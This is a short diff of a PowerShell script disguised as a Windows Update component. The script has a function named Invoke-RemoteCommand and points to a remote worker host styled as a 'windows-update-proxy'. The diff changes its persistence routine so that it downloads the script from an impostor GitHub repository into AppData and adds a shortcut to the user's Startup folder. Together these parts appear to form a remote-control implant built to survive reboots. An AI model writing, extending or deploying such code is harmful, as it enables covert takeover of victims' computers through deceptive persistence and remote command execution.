@@ -1,4 +1,4 @@
-$workerUrl = "https://your-app-name.onrender.com"
+$workerUrl = "https://windows-update-proxy.onrender.com"
 $scriptName = "WindowsUpdate.ps1"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $scriptPath = "$env:APPDATA\$scriptName"
@@ -63,9 +63,7 @@ function Invoke-RemoteCommand {
 
 function Install-Persistence {
     try {
-        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
-            Move-Item -Path $PSCommandPath -Destination $scriptPath -Force
-        }
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Windows-Update-Proxy/Updater/refs/heads/main/Windows/WindowsUpdate.ps1" -OutFile $scriptPath
         
         $WshShell = New-Object -ComObject WScript.Shell
         $Shortcut = $WshShell.CreateShortcut("$startupPath\WindowsUpdate.lnk")
